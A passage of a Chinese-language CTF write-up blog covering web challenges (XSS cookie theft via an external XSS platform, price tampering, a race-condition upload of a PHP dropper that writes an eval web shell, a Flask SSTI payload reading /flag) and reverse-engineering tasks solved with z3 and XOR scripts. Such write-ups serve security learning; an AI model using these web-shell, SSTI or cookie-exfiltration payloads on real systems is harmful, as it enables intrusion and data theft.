50</code></p><p><code>flag&#123;0k_!_G1v3_Y0u_th3_f1l@g_!_!&#125; </code></p><h2 id="kk园区审核员"><a href="#kk园区审核员" class="headerlink" title="kk园区审核员"></a>kk园区审核员</h2><p><code>善良的出题人组织了一次kk园区的参观活动，现在收集有意向前往的人员信息，提交后工作人员会第一时间审核哦，审核通过还能得到审核的美味曲奇奖励！</code></p><p>填表 - 提交 - 审核cookie<br>猜测是xss cookie外带</p><ul><li>找xss平台</li><li>复制payload并填表</li><li>提交并返回xss平台看记录</li></ul><p><a href="https://xssaq.com/login/">XSS平台-XSS测试网站-仅用于安全免费测试 (xssaq.com)</a></p><h2 id="reallyExpensive"><a href="#reallyExpensive" class="headerlink" title="reallyExpensive"></a>reallyExpensive</h2><p><img src="https://s2.loli.net/2024/11/05/7DyE3iWUVufhmX4.png" class="lazyload" data-srcset="https://s2.loli.net/2024/11/05/7DyE3iWUVufhmX4.png" srcset="data:image/png;base64,666" alt="Pasted image 20241026145214.png"><br>给了十块钱的余额要买好贵的flag<br>抓包改购买的数目<br><img src="https://s2.loli.net/2024/11/05/b1J2kXoOKpUf6c7.png" class="lazyload" data-srcset="https://s2.loli.net/2024/11/05/b1J2kXoOKpUf6c7.png" srcset="data:image/png;base64,666" alt="Pasted image 20241026145318.png"></p><p><code>flag&#123;^==^Y0uG@t$(t]$[r)^u^(e)-F10g!^&lt;&gt;^&#125;</code></p><h2 id="upload-quick"><a href="#upload-quick" class="headerlink" title="upload_quick"></a>upload_quick</h2><p>进入页面什么也干不了，没有找到文件上传的路径<br>文件上传的页面藏在js文件里</p><p>根据题目猜测条件竞争</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;Upl00000000ad.php HTTP&#x2F;1.1</span><br><span class="line">Host: 43.248.97.213:30014</span><br><span class="line">Content-Length: 331</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;127.0.0.0 Safari&#x2F;537.36 Edg&#x2F;127.0.0.0</span><br><span class="line">Origin: http:&#x2F;&#x2F;43.248.97.213:30014</span><br><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundaryY7TKFDA8ZwPEXpcS</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.7</span><br><span class="line">Referer: http:&#x2F;&#x2F;43.248.97.213:30014&#x2F;Upl00000000ad.php</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9,en;q&#x3D;0.8,en-GB;q&#x3D;0.7,en-US;q&#x3D;0.6</span><br><span class="line">Cookie: JSESSIONID&#x3D;886AD2DD7B34B204841F70E0D9696242</span><br><span class="line">Connection: keep-alive</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryY7TKFDA8ZwPEXpcS</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;upload_file&quot;; filename&#x3D;&quot;cmd.php&quot;</span><br><span class="line">Content-Type: application&#x2F;octet-stream</span><br><span class="line"></span><br><span class="line">&lt;?php fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[cmd]); ?&gt;&#39; ); ?&gt;</span><br><span class="line">------WebKitFormBoundaryY7TKFDA8ZwPEXpcS</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;submit&quot;</span><br><span class="line"></span><br><span class="line">ä¸ä¼ </span><br><span class="line">------WebKitFormBoundaryY7TKFDA8ZwPEXpcS--</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>重复发包的同时访问这个页面，生成shell.php，然后远程连接就可以了</p><p><code>flag&#123;9d097988-5eae-4c3b-86ac-d9b53ce4f340&#125;</code></p><h2 id="你买车票没"><a href="#你买车票没" class="headerlink" title="你买车票没"></a>你买车票没</h2><p>题目是一个登录框，需要输入账号密码，但是好像不是sql注入（因为测不出来）<br>每次提交都会弹窗<code>xxx,没买车票不能上车!!!</code><br>但是在返回的页面中并没有看到js代码或者请求的js文件<br><img src="https://s2.loli.net/2024/11/05/RAQpXqnZdsByFg4.png" class="lazyload" data-srcset="https://s2.loli.net/2024/11/05/RAQpXqnZdsByFg4.png" srcset="data:image/png;base64,666" alt="Pasted image 20241031215016.png"></p><p>一开始以为是使用php动态生成的js代码，但是没有思路<br>后面经过摸索发现是ssti模板注入，因为每次输入的用户名都会回显，所以可以使用<code>&#123;&#123; 4-1 &#125;&#125;</code>这样的输入测试，如果返回3就说明存在ssti模板注入<br><img src="https://s2.loli.net/2024/11/05/8ztdjws7mGfyO5J.png" class="lazyload" data-srcset="https://s2.loli.net/2024/11/05/8ztdjws7mGfyO5J.png" srcset="data:image/png;base64,666" alt="Pasted image 20241031215101.png"></p><p>确定了存在模板注入之后，还要确定怎么写payload<br><a href="https://xz.aliyun.com/t/3679?time__1311=n4+xnii=oGqmqDK0QDODlx6e0=bYhq3+hS+iD">flask之ssti模版注入从零到入门 - 先知社区 (aliyun.com)</a></p><p>payload有很多种，一般是从字符串或者列表出发，向上找基类，然后从基类往下找可以读取文件的函数<br>这里使用的payload：<code>&#123;&#123;"".__class__.__bases__[0].__subclasses__()[99]['get_data'](0,"/flag")&#125;&#125;</code></p><p>一般到subclasses之后就需要手动找目标函数，然后传入需要读的文件的路径，这里找到的是<code>FileLoader</code><br><img src="https://s2.loli.net/2024/11/05/Wi46qrVlchyZwt1.png" class="lazyload" data-srcset="https://s2.loli.net/2024/11/05/Wi46qrVlchyZwt1.png" srcset="data:image/png;base64,666" alt="Pasted image 20241031215137.png"></p><p><code>XSCTF&#123;SsT1_MilKTea_m1LktEa!&#125;</code></p><h2 id="隐秘的backdoor"><a href="#隐秘的backdoor" class="headerlink" title="隐秘的backdoor"></a>隐秘的backdoor</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">error_reporting(<span class="number">0</span>);  </span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);  </span><br><span class="line">$cmd = $_POST[<span class="string">&#x27;cmd&#x27;</span>];  </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;cmd&#x27;</span>]))&#123;    phpinfo();  </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;不要这样！TuT&quot;</span>);  </span><br><span class="line">&#125; <span class="keyword">else</span> &#123;    $cmd = $_POST[<span class="string">&#x27;cmd&#x27;</span>];  </span><br><span class="line">    <span class="keyword">eval</span>($cmd);  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>查询了很多绕过的方式，还是不行<br>然后看了看php的版本，查到了这个版本的漏洞</p><p><img src="https://s2.loli.net/2024/11/05/jpeT8Ns1dAkIufM.png" class="lazyload" data-srcset="https://s2.loli.net/2024/11/05/jpeT8Ns1dAkIufM.png" srcset="data:image/png;base64,666" alt="Pasted image 20241026174307.png"></p><p>具体上网搜</p><p><code>flag&#123;B@ck_do0r_!_B4ck_d0or_!&#125;</code></p><h2 id="calculate"><a href="#calculate" class="headerlink" title="calculate"></a>calculate</h2><p>查壳，发现upx，<code>upx.exe -d calculate.exe</code><br>然后扔进ida，发现这么一个函数<br><img src="https://s2.loli.net/2024/11/05/JsoIkSvtbaWhfqP.png" class="lazyload" data-srcset="https://s2.loli.net/2024/11/05/JsoIkSvtbaWhfqP.png" srcset="data:image/png;base64,666" alt="Pasted image 20241025211214.png"></p><p>百度下叫约束求解（看起来有点像矩阵运算）<br>1000多行手工提取不实际，写个脚本处理下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;asd.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    content = f.readlines()</span><br><span class="line"></span><br><span class="line">tmp = <span class="string">&#x27;&#x27;</span></span><br><span class="line">final = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> content:</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;return 0i64;&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> i:</span><br><span class="line">        tmp += i.strip()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        final.append(tmp)</span><br><span class="line">        tmp = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">print(final)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;tmp1.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> final:</span><br><span class="line">        f.write(i+<span class="string">&#x27;\n&#x27;</span>)</span><br></pre></td></tr></table></figure><p>初步处理之后手动删去前后缀，就得到了公式（字符串版）</p><p>然后使用python中一个叫z3的库，专门用来求解这种方程组<br>其中有一个方法可以将字符串版的方程转换为python可以处理的表达式</p><p>以下是一个模板</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solver_eng</span>(<span class="params">fc</span>):</span></span><br><span class="line">    <span class="comment"># 创建解释器对象</span></span><br><span class="line">    solver = Solver()</span><br><span class="line">    <span class="comment"># 添加约束方程</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(fc)):</span><br><span class="line">        solver.add(<span class="built_in">eval</span>(fc[i])) <span class="comment">#eval函数会将字符串形式的方程转换为z3模块能解析的方程</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 求解并转化为字符输出，得到flag</span></span><br><span class="line">    <span class="keyword">if</span> solver.check() == sat:  <span class="comment"># check()方法用来判断是否有解，sat(即satisify)表示满足有解</span></span><br><span class="line">        ans = solver.model()  <span class="comment"># model()方法得到解</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> v:</span><br><span class="line">            print(<span class="built_in">chr</span>(ans[i].as_long()), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="comment"># 一般不会无解，如果无解八成是未知数变量的类型不符合，或约束方程添加错误</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">&quot;no ans!&quot;</span>)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># 设置方程，请用脚本将条件中的所有方程处理成列表，然后赋值给fc列表（这样你就不用一个一个方程慢慢去复制了）</span></span><br><span class="line">    fc = []</span><br><span class="line">    <span class="comment"># 创建未知数变量</span></span><br><span class="line">    v = [Int(<span class="string">f&#x27;v<span class="subst">&#123;i&#125;</span>&#x27;</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(fc))]</span><br><span class="line"> </span><br><span class="line">    solver_eng(fc)</span><br></pre></td></tr></table></figure><p>根据题目修改一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;tmp1.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    content = f.readlines()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solver_eng</span>(<span class="params">fc</span>):</span></span><br><span class="line">    solver = Solver()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(fc)):</span><br><span class="line">        solver.add(<span class="built_in">eval</span>(fc[i]))</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> solver.check() == sat:</span><br><span class="line">        ans = solver.model()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> v:</span><br><span class="line">            print(<span class="built_in">chr</span>(ans[i].as_long()), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">     print(<span class="string">&#x27;Error&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    fc = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> content:</span><br><span class="line">        fc.append(i.strip())</span><br><span class="line">    v = [Int(<span class="string">f&#x27;v<span class="subst">&#123;i&#125;</span>&#x27;</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(fc))]</span><br><span class="line">    </span><br><span class="line">    solver_eng(fc)</span><br></pre></td></tr></table></figure><p><code>flag&#123;n0w_y0u_know_UPX!&#125;</code></p><p><a href="https://blog.csdn.net/liKeQing1027520/article/details/138047537">z3求解器脚本（CTF-reverse必备）_ctf z3-CSDN博客</a></p><h2 id="call-above-call"><a href="#call-above-call" class="headerlink" title="call_above_call"></a>call_above_call</h2><p>核心代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">// bad sp value at call has been detected, the output may be wrong!</span><br><span class="line"><span class="built_in">int</span> __cdecl main(<span class="built_in">int</span> argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">int</span> v4; // [esp<span class="number">-14</span>h] [ebp<span class="number">-90</span>h]</span><br><span class="line">  <span class="built_in">int</span> v5; // [esp<span class="number">-10</span>h] [ebp<span class="number">-8</span>Ch]</span><br><span class="line">  <span class="built_in">int</span> v6; // [esp-Ch] [ebp<span class="number">-88</span>h]</span><br><span class="line">  <span class="built_in">int</span> v7; // [esp<span class="number">-8</span>h] [ebp<span class="number">-84</span>h]</span><br><span class="line">  <span class="built_in">int</span> v8; // [esp<span class="number">-4</span>h] [ebp<span class="number">-80</span>h]</span><br><span class="line">  <span class="built_in">int</span> v9; // [esp+<span class="number">0</span>h] [ebp<span class="number">-7</span>Ch]</span><br><span class="line">  <span class="built_in">int</span> v10; // [esp+<span class="number">4</span>h] [ebp<span class="number">-78</span>h]</span><br><span class="line">  <span class="built_in">int</span> i; // [esp+<span class="number">4</span>h] [ebp<span class="number">-78</span>h]</span><br><span class="line">  <span class="built_in">int</span> v12; // [esp+<span class="number">8</span>h] [ebp<span class="number">-74</span>h]</span><br><span class="line">  char s[<span class="number">100</span>]; // [esp+Ch] [ebp<span class="number">-70</span>h] BYREF</span><br><span class="line">  unsigned <span class="built_in">int</span> v14; // [esp+<span class="number">70</span>h] [ebp-Ch]</span><br><span class="line">  <span class="built_in">int</span> *p_argc; // [esp+<span class="number">74</span>h] [ebp<span class="number">-8</span>h]</span><br><span class="line"></span><br><span class="line">  p_argc = &amp;argc;</span><br><span class="line">  v14 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  v12 = generate();</span><br><span class="line">  printf(<span class="string">&quot;input your key:&quot;</span>);</span><br><span class="line">  ((void (__stdcall *)(const char *, char *, <span class="built_in">int</span>, <span class="built_in">int</span>, <span class="built_in">int</span>, <span class="built_in">int</span>, <span class="built_in">int</span>, <span class="built_in">int</span>, <span class="built_in">int</span>, <span class="built_in">int</span>))__isoc99_scanf)(</span><br><span class="line">    <span class="string">&quot;%s&quot;</span>,</span><br><span class="line">    s,</span><br><span class="line">    v4,</span><br><span class="line">    v5,</span><br><span class="line">    v6,</span><br><span class="line">    v7,</span><br><span class="line">    v8,</span><br><span class="line">    <span class="number">1</span>,</span><br><span class="line">    v10,</span><br><span class="line">    v12);</span><br><span class="line">  <span class="keyword">if</span> ( strlen(s) != <span class="number">25</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    printf(<span class="string">&quot;Sorry!&quot;</span>);</span><br><span class="line">    exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  wuhuwuhu((<span class="built_in">int</span>)s);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">24</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( s[i] != *(_BYTE *)(enc + i) )</span><br><span class="line">    &#123;</span><br><span class="line">      v9 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v9 )</span><br><span class="line">    printf(<span class="string">&quot;Congratulations!&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    printf(<span class="string">&quot;try again!&quot;</span>);</span><br><span class="line">  end_m(p_argc);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span> __cdecl wuhuwuhu(<span class="built_in">int</span> a1)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">int</span> i; // [esp+<span class="number">8</span>h] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">23</span>; ++i )</span><br><span class="line">    *(_BYTE *)(i + a1) ^= *(_BYTE *)(i + <span class="number">1</span> + a1);</span><br><span class="line">  <span class="keyword">return</span> a1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主要逻辑：接收输入然后循环异或输入（元素1和元素2异或的结果替换元素1），然后和目标数组比较，但是目标数组是动态的，因此需要动态调试<br>拿到目标数组后反过来异或就可以了</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">s = [<span class="number">0x0A</span>, <span class="number">0x0D</span>, <span class="number">0x06</span>, <span class="number">0x1C</span>, <span class="number">0x4B</span>, <span class="number">0x49</span>, <span class="number">0x17</span>, <span class="number">0x5A</span>, <span class="number">0x59</span>, <span class="number">0x04</span>, <span class="number">0x0A</span>, <span class="number">0x3C</span>, <span class="number">0x3B</span>, <span class="number">0x57</span>, <span class="number">0x51</span>, <span class="number">0x17</span>, <span class="number">0x12</span>, <span class="number">0x38</span>, <span class="number">0x26</span>, <span class="number">0x00</span>, <span class="number">0x1D</span>, <span class="number">0x17</span>, <span class="number">0x52</span>, <span class="number">0x5C</span>, <span class="number">0x7D</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">    s[<span class="built_in">len</span>(s)<span class="number">-2</span>-i] = s[<span class="built_in">len</span>(s)<span class="number">-2</span>-i] ^ s[<span class="built_in">len</span>(s)<span class="number">-1</span>-i]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    print(<span class="built_in">chr</span>(i), end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p><code>flag&#123;0yn4mic_d3bug_yyds!&#125;</code></p><h2 id="cube3"><a href="#cube3" class="headerlink" title="cube3"></a>cube3</h2><p>题目描述</p><ol><li>你玩过三阶魔方吗,你能看懂R U R’ U’这样的公式吗,这里有4个魔方等你来还原</li><li>公式(步骤)格式例如R U’ R U R U R U’ R’ U’ R2’ &lt;回车&gt;,每步操作用空格分开,逆时针加上’字符</li><li>flag格式为xsctf{formula},其中formula为4个魔方的还原步骤依次连在一起,去掉空格,取其md5</li><li>本题在Ubuntu22下编译,请不要使用ubuntu18<blockquote><p>6个面，一共24种旋转操作，分析时需要对号入座</p></blockquote></li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// [rsp+Bh] [rbp-3B5h]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [rsp+Ch] [rbp-3B4h]</span></span><br><span class="line">  <span class="keyword">char</span> v6[<span class="number">160</span>]; <span class="comment">// [rsp+10h] [rbp-3B0h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v7[<span class="number">40</span>]; <span class="comment">// [rsp+B0h] [rbp-310h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v8[<span class="number">160</span>]; <span class="comment">// [rsp+150h] [rbp-270h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v9[<span class="number">114</span>]; <span class="comment">// [rsp+1F0h] [rbp-1D0h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v10; <span class="comment">// [rsp+3B8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v10 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  cube_init((__int64)v9);</span><br><span class="line">  print_menu(v9, argv);</span><br><span class="line">  v4 = getchar();</span><br><span class="line">  getchar();</span><br><span class="line">  <span class="keyword">if</span> ( v4 &lt;= <span class="string">&#x27;0&#x27;</span> || v4 &gt; <span class="number">52</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v4 == <span class="number">53</span> )</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;bye!&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;error!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    formula_get_by_id((__int64)v6, v4 - <span class="number">48</span>);</span><br><span class="line">    cube_scramble((__int64)v9, (__int64)v6);</span><br><span class="line">    cube_print((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)v9);</span><br><span class="line">    v5 = <span class="number">0</span>;</span><br><span class="line">    formula_input((<span class="keyword">char</span> *)v7);</span><br><span class="line">    <span class="keyword">while</span> ( v7[v5] != <span class="number">24</span> )</span><br><span class="line">      cube_rotating((__int64)v9, v7[v5++]);</span><br><span class="line">    cube_print((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)v9);</span><br><span class="line">    formula_reverse(v7, v8);</span><br><span class="line">    <span class="keyword">if</span> ( !(<span class="keyword">unsigned</span> <span class="keyword">int</span>)cube_isorigin(v9) || (<span class="keyword">unsigned</span> <span class="keyword">int</span>)formula_cmp(v6, v8) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)cube_isorigin(v9) &amp;&amp; (<span class="keyword">unsigned</span> <span class="keyword">int</span>)formula_cmp(v6, v8) )</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Restore successfully!!!But not reverse!!!&quot;</span>);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Restore failed!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Restore successfully!!!You reversed the formula!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;press anykey to continue...&quot;</span>);</span><br><span class="line">  getchar();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行是这样的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 